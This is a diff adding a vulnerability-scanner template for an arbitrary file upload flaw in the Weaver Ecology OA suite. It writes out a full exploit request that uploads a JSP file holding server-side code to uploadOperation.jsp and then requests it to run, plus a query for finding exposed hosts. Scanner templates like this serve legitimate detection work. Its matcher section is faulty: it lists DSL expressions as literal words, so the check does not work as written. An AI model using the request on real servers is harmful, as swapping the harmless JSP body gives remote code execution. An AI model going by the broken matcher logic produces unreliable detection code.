@@ -1,0 +1,44 @@
+id: ecology-arbitrary-file-upload
+
+info:
+  name: Ecology - Arbitrary File Upload
+  author: ritikchaddha
+  severity: critical
+  description: Ecology contains an arbitrary file upload vulnerability. An attacker can upload arbitrary files to the server, which in turn can be used to make the application execute file content as code, As a result, an attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
+  reference:
+    - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-434
+  metadata:
+    max-request: 2
+    fofa-query: app="泛微-协同办公OA"
+  tags: ecology,fileupload,intrusive
+
+http:
+  - raw:
+      - |
+        POST /page/exportImport/uploadOperation.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo
+
+        ------WebKitFormBoundaryFy3iNVBftjP6IOwo
+        Content-Disposition: form-data; name="file"; filename="{{randstr}}.jsp"
+        Content-Type: application/octet-stream
+
+        <%out.print(364536*876356);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundaryFy3iNVBftjP6IOwo--
+      - |
+        GET /page/exportImport/fileTransfer/{{randstr}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "status_code_1 == 200"
+          - "contains(body_2, '319463310816') || status_code_2 == 200"
+        condition: and
+# digest: 4b0a00483046022100cf16db31b2aee3b0c924ebf9cd72c53feb95263f0814f455ed86597a39b63aab022100ce85ea3c623595a128aa19dc20042ed0e41bfe30c0ca1f329538b3c0082b3e2a:922c64590222798bb761d5b6d8e72950
